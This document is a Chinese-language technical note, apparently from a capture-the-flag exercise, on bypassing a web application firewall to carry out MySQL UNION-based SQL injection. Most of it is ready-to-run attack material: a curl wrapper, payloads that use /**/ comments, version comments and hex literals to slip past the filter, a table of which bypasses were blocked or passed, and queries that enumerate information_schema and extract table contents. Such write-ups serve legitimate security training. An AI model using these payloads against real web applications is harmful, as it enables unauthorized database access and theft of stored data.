# 技术笔记：WAF 只拦「SQL 关键字 + 空白」组合时的 UNION 注入

## 什么时候用

出现下列**可观察特征**时直接套用本笔记：

- 参数值被拼进查询且**有回显**：正常值在返回页面的 `<td>` 等固定位置渲染出字段；
  恒假条件返回「未查询到……」之类的空结果页，而不是数据库报错 → 回显型注入，UNION 可用。
- 发一条带空格的经典 payload（如 `0 union select 1,2,3,4`）返回的是**一条固定文案**
  （如「请求已被 WAF 拦截」），既不是正常业务页也不是 DB 报错 → 前面有 WAF，且它吐自己的页面。
- 把该 payload 里的空格全部换成 `/**/` 就能过 → 规则的实际特征是「关键字后跟空白」，
  而不是关键字本身。这是本方法的**判定特征**：空白是唯一变量。
- `version()` 回显 MySQL/MariaDB 系 → `/**/`、版本注释、`0x` 十六进制字面量都合法。
- 同一 payload 换 Content-Type（urlencoded ↔ `multipart/form-data`）结果不变
  → 规则作用在解码后的参数值上，换解析器无效。

一句话判据：**单写关键字不拦、带空格才拦、换成注释就放**。

## 怎么做

统一用环境变量承接目标与 curl，下文命令可直接跑（Windows 下 `CURL=curl.exe`）。

```bash
TARGET='http://<host>:<port>/' ; CURL=curl.exe
# 把回显表格里的 <td> 内容用 | 连起来打印
q(){ $CURL -s -X POST --data-urlencode "id=$1" "$TARGET" \
     | grep -o '<td>[^<]*</td>' | sed -e 's/<[^>]*>//g' | paste -sd'|' -; }
```

1. **端到端最小样本 + 布尔对照**。注入点用两发确认，不靠报错：

   ```bash
   q 1                       # 正常行，记住回显了几列、长什么样
   q '1/**/and/**/1=1'       # 1 行
   q '1/**/and/**/1=2'       # 0 行 / 空结果页
   ```

   布尔对照里就用 `/**/`，等于顺手验证了绕过可用的分隔符，省一轮摸索。

2. **WAF 最小对照**：一次只改一个变量，逐个记录「拦 / 放」。
   实测形状（本题的结论，仅供参考，换题必须重测）：

   | 变体 | 结果 |
   |---|---|
   | 大小写 `Union Select` | 拦 |
   | `union all` | 拦 |
   | `%09` / `%0a` / `%0d%0a` / `%20` 替空格 | 拦 |
   | 双写 `ununion` | 拦 |
   | `/**/` 替全部空格 | **放** |
   | `/*!50000union*/` 版本注释 | 放 |
   | `union(select ...)` 括号拼接 | 放 |
   | `multipart/form-data` 提交 | 拦 |

   推论：规则大小写不敏感、覆盖整个 `\s` 类空白、不是简单删词。绕过点只能是
   **在语法上等价空白、但不属于空白字符**的写法。

3. **定列**：`q '0/**/union/**/select/**/1,2,3,4'` → 回显 `1|2|3|4`，
   说明原查询 4 列，且数字出现的位置就是可用回显位。前缀用 `0` 让原查询无结果，页面只显示注入行。

4. **元数据**：`q '0/**/union/**/select/**/1,database(),version(),current_user()'`。

5. **枚举表 / 列 / 取值**。库名表名用十六进制字面量代替引号字符串，顺带规避引号过滤：

   ```sql
   0/**/union/**/select/**/1,2,3,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=<0xHEX(库名)>
   0/**/union/**/select/**/1,2,3,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=<0xHEX(表名)>
   0/**/union/**/select/**/1,2,3,<列名>/**/from/**/<表名>
   ```

   `group_concat` 一次拉全，请求数和 WAF 命中面都更小。

## 坑

- **不要用 `--` 注释**。MySQL 要求 `--` 后必须跟空白才成注释，这一空格正好踩规则；
  用 `#`（urlencode 为 `%23`）或干脆不加注释。
- **不要假设 multipart 能绕过**。本题两种 Content-Type 都返回同一条拦截页，
  说明规则在参数值层。验证方式：同一 payload 两种 `Content-Type` 各发一次，比对返回页。
  这条「经典绕过」在本题是实测否定项，别照搬。
- **不要拿大小写 / 双写 / `%09` 当突破口**。全部实测被拦，它们只能用来**确认规则形状**
  （= 证明 `\s` 类被整体覆盖），不能用来绕。
- **不要把空格换成其他空白字符**（`%09`、`%0a`）。`/**/` 之所以有效，恰恰因为它不是空白类字符，
  却在 MySQL 词法上等价于分隔符。
- **别用 `order by` 猜列**。回显型注入直接 `union select 1,...,n` 即可，数字出现在哪一目了然。

## 边界

- 仅适用于 **MySQL/MariaDB** 方言：`/**/`、`/*!50000...*/`、`0x...` 十六进制字面量都是 MySQL 特性，
  PostgreSQL / MSSQL / Oracle 的注释与字面量规则不同，需另行构造。
- 若 WAF 同时过滤 `/**/`、括号拼接与版本注释，本路不通；转向编码/协议层绕过，**本次未验证**。
- 需要**有回显**。页面不回显查询结果时 UNION 定列不可用，得转布尔或时间盲注，本笔记的 payload 形态不适用。
- 需要能自由控制参数值（`--data-urlencode` 或等效）。若参数被二次过滤/白名单化，结论不成立。
- 未验证：WAF 对超长请求、分块传输（chunked）、参数污染（同名参数多次提交）的行为差异。
